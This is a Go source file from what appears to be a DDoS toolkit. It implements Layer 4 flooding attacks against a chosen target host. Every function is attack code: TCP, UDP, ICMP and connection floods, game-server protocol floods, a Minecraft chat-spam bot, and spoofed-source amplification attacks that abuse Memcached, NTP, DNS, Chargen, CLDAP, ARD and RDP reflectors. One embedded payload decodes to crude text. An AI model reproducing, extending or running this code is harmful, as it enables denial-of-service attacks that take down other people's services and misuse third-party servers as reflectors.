package attacks

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/go-ddos-tools/pkg/minecraft"
	"github.com/go-ddos-tools/pkg/proxy"
	"github.com/go-ddos-tools/pkg/utils"
)

// Layer4Config holds configuration for Layer 4 attacks
type Layer4Config struct {
	Method     string
	Host       string
	Port       int
	Threads    int
	Duration   int
	Proxies    []proxy.Proxy
	Reflectors []string
	ProtocolID int
}

// RunLayer4Attack executes a Layer 4 attack
func RunLayer4Attack(cfg *Layer4Config, wg *sync.WaitGroup, stopChan chan struct{}, requestsSent, bytesSent *utils.Counter) {
	for i := range cfg.Threads {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()

			for {
				select {
				case <-stopChan:
					return
				default:
					executeLayer4Method(cfg, requestsSent, bytesSent)
				}
			}
		}(i)
	}
}

func executeLayer4Method(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	switch cfg.Method {
	case "TCP":
		executeTCP(cfg, requestsSent, bytesSent)
	case "UDP":
		executeUDP(cfg, requestsSent, bytesSent)
	case "SYN":
		executeSYN(cfg, requestsSent, bytesSent)
	case "MINECRAFT":
		executeMINECRAFT(cfg, requestsSent, bytesSent)
	case "VSE":
		executeVSE(cfg, requestsSent, bytesSent)
	case "TS3":
		executeTS3(cfg, requestsSent, bytesSent)
	case "FIVEM":
		executeFIVEM(cfg, requestsSent, bytesSent)
	case "FIVEM-TOKEN":
		executeFIVEMTOKEN(cfg, requestsSent, bytesSent)
	case "MCPE":
		executeMCPE(cfg, requestsSent, bytesSent)
	case "CPS":
		executeCPS(cfg, requestsSent, bytesSent)
	case "CONNECTION":
		executeCONNECTION(cfg, requestsSent, bytesSent)
	case "OVH-UDP":
		executeOVHUDP(cfg, requestsSent, bytesSent)
	case "MCBOT":
		executeMCBOT(cfg, requestsSent, bytesSent)
	case "ICMP":
		executeICMP(cfg, requestsSent, bytesSent)
	case "MEM":
		executeMEM(cfg, requestsSent, bytesSent)
	case "NTP":
		executeNTP(cfg, requestsSent, bytesSent)
	case "DNS":
		executeDNS(cfg, requestsSent, bytesSent)
	case "CHAR":
		executeCHAR(cfg, requestsSent, bytesSent)
	case "CLDAP":
		executeCLDAP(cfg, requestsSent, bytesSent)
	case "ARD":
		executeARD(cfg, requestsSent, bytesSent)
	case "RDP":
		executeRDP(cfg, requestsSent, bytesSent)
	default:
		executeTCP(cfg, requestsSent, bytesSent)
	}
}

func executeTCP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	data := utils.RandomBytes(1024)
	for {
		n, err := conn.Write(data)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	data := utils.RandomBytes(1024)
	for range 100 {
		n, err := conn.Write(data)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeSYN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// SYN flood requires raw sockets which need root/admin privileges
	// This is a simplified version
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	for range 10 {
		conn, err := net.DialTimeout("tcp", target, 100*time.Millisecond)
		if err == nil {
			conn.Close()
			requestsSent.Add(1)
		}
	}
}

func executeMINECRAFT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	handshake := minecraft.Handshake(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 1)
	ping := minecraft.Data([]byte{0x00})

	for {
		n1, err := conn.Write(handshake)
		if err != nil {
			break
		}
		n2, err := conn.Write(ping)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n1 + n2))
	}
}

func executeVSE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// VSE (Valve Source Engine) query packet
	payload := []byte{
		0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75,
		0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69,
		0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeTS3(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// TS3 (TeamSpeak 3) query packet
	payload := []byte{
		0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89,
		0x00, 0x00, 0x00, 0x00, 0x02,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeFIVEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// FiveM query packet
	payload := []byte{0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeFIVEMTOKEN(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	for range 100 {
		token := fmt.Sprintf("%s-%s-%s-%s",
			utils.RandString(8),
			utils.RandString(4),
			utils.RandString(4),
			utils.RandString(12))
		guid := fmt.Sprintf("%d", 76561197960265728+rand.Int63n(39734735271))

		payload := fmt.Sprintf("token=%s&guid=%s", token, guid)
		n, err := conn.Write([]byte(payload))
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeMCPE(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	// MCPE (Minecraft Pocket Edition) packet
	payload := []byte{
		0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74,
		0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20,
		0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61,
		0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74,
		0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20,
		0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69,
		0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62,
		0x61, 0x6c, 0x6c, 0x73,
	}

	for range 100 {
		n, err := conn.Write(payload)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeCPS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	for range 10 {
		conn, err := net.DialTimeout("tcp", target, 1*time.Second)
		if err == nil {
			conn.Close()
			requestsSent.Add(1)
		}
	}
}

func executeCONNECTION(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}

	go func() {
		defer conn.Close()
		buf := make([]byte, 1024)
		for {
			_, err := conn.Read(buf)
			if err != nil {
				break
			}
		}
	}()

	requestsSent.Add(1)
	time.Sleep(5 * time.Second)
}

// Helper function to create TCP checksum
func tcpChecksum(data []byte) uint16 {
	sum := uint32(0)
	for i := range len(data) - 1 {
		if i%2 != 0 {
			continue
		}
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum = sum + (sum >> 16)
	return uint16(^sum)
}

func executeOVHUDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// OVH-UDP requires raw sockets for custom UDP packets with HTTP payloads
	// This is a simplified implementation that sends UDP packets with HTTP-like payloads
	target := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
	addr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return
	}
	defer conn.Close()

	methods := []string{"PGET", "POST", "HEAD", "OPTIONS", "PURGE"}
	paths := []string{"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\", "/", "/null", "/%00%00%00%00"}

	for range utils.RandInt(2, 4) {
		payloadSize := utils.RandInt(1024, 2048)
		randomPart := string(utils.RandomBytes(payloadSize))

		method := methods[rand.Intn(len(methods))]
		path := paths[rand.Intn(len(paths))]

		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
			method, path, randomPart, cfg.Host, cfg.Port)

		n, err := conn.Write([]byte(payload))
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

func executeMCBOT(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
	conn, err := net.DialTimeout("tcp", target, 1*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	// Generate UUID (simplified version - just use a random string)
	uuid := fmt.Sprintf("%s-%s-%s-%s-%s",
		utils.RandString(8),
		utils.RandString(4),
		utils.RandString(4),
		utils.RandString(4),
		utils.RandString(12))

	// Send handshake with forwarding
	handshake := minecraft.HandshakeForwarded(cfg.Host, uint16(cfg.Port), cfg.ProtocolID, 2, utils.RandIPv4(), uuid)
	n1, err := conn.Write(handshake)
	if err != nil {
		return
	}
	bytesSent.Add(int64(n1))

	// Generate username and password
	username := fmt.Sprintf("Bot_%s", utils.RandString(5))
	password := utils.RandString(8)

	// Send login packet
	loginPacket := minecraft.Login(cfg.ProtocolID, username)
	n2, err := conn.Write(loginPacket)
	if err != nil {
		return
	}
	bytesSent.Add(int64(n2))

	// Wait a bit before registering
	time.Sleep(1500 * time.Millisecond)

	// Send register command
	registerCmd := fmt.Sprintf("/register %s %s", password, password)
	registerPacket := minecraft.Chat(cfg.ProtocolID, registerCmd)
	n3, err := conn.Write(registerPacket)
	if err != nil {
		return
	}
	bytesSent.Add(int64(n3))

	// Send login command
	loginCmd := fmt.Sprintf("/login %s", password)
	loginPacket2 := minecraft.Chat(cfg.ProtocolID, loginCmd)
	n4, err := conn.Write(loginPacket2)
	if err != nil {
		return
	}
	bytesSent.Add(int64(n4))

	// Send spam chat messages
	for range 10 {
		chatMsg := utils.RandString(256)
		chatPacket := minecraft.Chat(cfg.ProtocolID, chatMsg)
		n, err := conn.Write(chatPacket)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
		time.Sleep(1100 * time.Millisecond)
	}
}

func executeICMP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// ICMP flooding requires raw sockets which need elevated privileges
	// This is a simplified implementation using UDP as a fallback
	// For full ICMP support, the application needs to be run with root/admin privileges

	// Try to create raw ICMP socket (may fail without privileges)
	conn, err := net.DialTimeout("ip4:icmp", cfg.Host, 1*time.Second)
	if err != nil {
		// Fallback to UDP if raw socket creation fails
		target := net.JoinHostPort(cfg.Host, fmt.Sprintf("%d", cfg.Port))
		udpAddr, err := net.ResolveUDPAddr("udp", target)
		if err != nil {
			return
		}
		udpConn, err := net.DialUDP("udp", nil, udpAddr)
		if err != nil {
			return
		}
		defer udpConn.Close()

		// Send ICMP-like payload via UDP
		for range 100 {
			payload := utils.RandomBytes(utils.RandInt(16, 1024))
			n, err := udpConn.Write(payload)
			if err != nil {
				break
			}
			requestsSent.Add(1)
			bytesSent.Add(int64(n))
		}
		return
	}
	defer conn.Close()

	// Send ICMP echo requests
	for i := range 100 {
		// ICMP Echo Request
		// Type: 8 (Echo Request), Code: 0
		icmpType := byte(8)
		icmpCode := byte(0)
		checksum := uint16(0)
		identifier := uint16(rand.Intn(65535))
		sequence := uint16(i)

		// Construct ICMP packet
		payload := utils.RandomBytes(utils.RandInt(16, 1024))
		packet := make([]byte, 8+len(payload))
		packet[0] = icmpType
		packet[1] = icmpCode
		binary.BigEndian.PutUint16(packet[2:4], checksum)
		binary.BigEndian.PutUint16(packet[4:6], identifier)
		binary.BigEndian.PutUint16(packet[6:8], sequence)
		copy(packet[8:], payload)

		// Calculate checksum
		checksum = tcpChecksum(packet)
		binary.BigEndian.PutUint16(packet[2:4], checksum)

		n, err := conn.Write(packet)
		if err != nil {
			break
		}
		requestsSent.Add(1)
		bytesSent.Add(int64(n))
	}
}

// Amplification attack helper - creates spoofed UDP packets
func executeAmplification(cfg *Layer4Config, payload []byte, port int, requestsSent, bytesSent *utils.Counter) {
	if len(cfg.Reflectors) == 0 {
		return
	}

	// Create raw UDP socket
	conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
	if err != nil {
		// Fallback to regular UDP if raw socket fails
		executeAmplificationFallback(cfg, payload, port, requestsSent, bytesSent)
		return
	}
	defer conn.Close()

	// Build UDP packets with IP spoofing
	for range 100 {
		for _, reflector := range cfg.Reflectors {
			packet := buildUDPPacket(cfg.Host, reflector, cfg.Port, port, payload)
			addr, err := net.ResolveIPAddr("ip4", reflector)
			if err != nil {
				continue
			}

			n, err := conn.WriteTo(packet, addr)
			if err != nil {
				continue
			}
			requestsSent.Add(1)
			bytesSent.Add(int64(n))
		}
	}
}

// Fallback amplification when raw sockets are not available
func executeAmplificationFallback(cfg *Layer4Config, payload []byte, port int, requestsSent, bytesSent *utils.Counter) {
	if len(cfg.Reflectors) == 0 {
		return
	}

	for range 100 {
		for _, reflector := range cfg.Reflectors {
			target := net.JoinHostPort(reflector, fmt.Sprintf("%d", port))
			addr, err := net.ResolveUDPAddr("udp", target)
			if err != nil {
				continue
			}

			conn, err := net.DialUDP("udp", nil, addr)
			if err != nil {
				continue
			}

			n, err := conn.Write(payload)
			conn.Close()

			if err == nil {
				requestsSent.Add(1)
				bytesSent.Add(int64(n))
			}
		}
	}
}

// Build a raw UDP packet with IP spoofing
func buildUDPPacket(srcIP, dstIP string, srcPort, dstPort int, payload []byte) []byte {
	// Parse IPs
	src := net.ParseIP(srcIP).To4()
	dst := net.ParseIP(dstIP).To4()

	if src == nil || dst == nil {
		return nil
	}

	// Build UDP header
	udpHeader := make([]byte, 8)
	binary.BigEndian.PutUint16(udpHeader[0:2], uint16(srcPort))
	binary.BigEndian.PutUint16(udpHeader[2:4], uint16(dstPort))
	binary.BigEndian.PutUint16(udpHeader[4:6], uint16(8+len(payload)))
	binary.BigEndian.PutUint16(udpHeader[6:8], 0) // Checksum (0 for now)

	// Build IP header
	ipHeader := make([]byte, 20)
	ipHeader[0] = 0x45                                                   // Version 4, header length 5
	ipHeader[1] = 0x00                                                   // TOS
	binary.BigEndian.PutUint16(ipHeader[2:4], uint16(20+8+len(payload))) // Total length
	binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))  // ID
	ipHeader[6] = 0x00                                                   // Flags
	ipHeader[7] = 0x00                                                   // Fragment offset
	ipHeader[8] = 64                                                     // TTL
	ipHeader[9] = 17                                                     // Protocol (UDP)
	binary.BigEndian.PutUint16(ipHeader[10:12], 0)                       // Checksum (calculated later)
	copy(ipHeader[12:16], src)
	copy(ipHeader[16:20], dst)

	// Calculate IP checksum
	checksum := ipChecksum(ipHeader)
	binary.BigEndian.PutUint16(ipHeader[10:12], checksum)

	// Combine all parts
	packet := append(ipHeader, udpHeader...)
	packet = append(packet, payload...)

	return packet
}

// Calculate IP checksum
func ipChecksum(data []byte) uint16 {
	sum := uint32(0)
	for i := range len(data) - 1 {
		if i%2 != 0 {
			continue
		}
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 != 0 {
		sum += uint32(data[len(data)-1]) << 8
	}
	sum = (sum >> 16) + (sum & 0xffff)
	sum = sum + (sum >> 16)
	return uint16(^sum)
}

// MEM - Memcached amplification attack
func executeMEM(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// Memcached payload: gets command
	payload := []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 'g', 'e', 't', 's', ' ', 'p', ' ', 'h', ' ', 'e', '\n'}
	executeAmplification(cfg, payload, 11211, requestsSent, bytesSent)
}

// NTP - Network Time Protocol amplification attack
func executeNTP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// NTP monlist request
	payload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	executeAmplification(cfg, payload, 123, requestsSent, bytesSent)
}

// DNS - DNS amplification attack
func executeDNS(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// DNS query for ANY record
	payload := []byte{
		0x45, 0x67, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x02, 0x73, 0x6c, 0x00,
		0x00, 0xff, 0x00, 0x01, 0x00, 0x00, 0x29, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}
	executeAmplification(cfg, payload, 53, requestsSent, bytesSent)
}

// CHAR - Chargen amplification attack
func executeCHAR(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// Chargen simple request
	payload := []byte{0x01}
	executeAmplification(cfg, payload, 19, requestsSent, bytesSent)
}

// CLDAP - CLDAP amplification attack
func executeCLDAP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// CLDAP LDAP search request
	payload := []byte{
		0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04, 0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00,
		0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00, 0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65,
		0x63, 0x74, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
	}
	executeAmplification(cfg, payload, 389, requestsSent, bytesSent)
}

// ARD - Apple Remote Desktop amplification attack
func executeARD(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// ARD request
	payload := []byte{0x00, 0x14, 0x00, 0x00}
	executeAmplification(cfg, payload, 3283, requestsSent, bytesSent)
}

// RDP - Remote Desktop Protocol amplification attack
func executeRDP(cfg *Layer4Config, requestsSent, bytesSent *utils.Counter) {
	// RDP connection request
	payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	executeAmplification(cfg, payload, 3389, requestsSent, bytesSent)
}
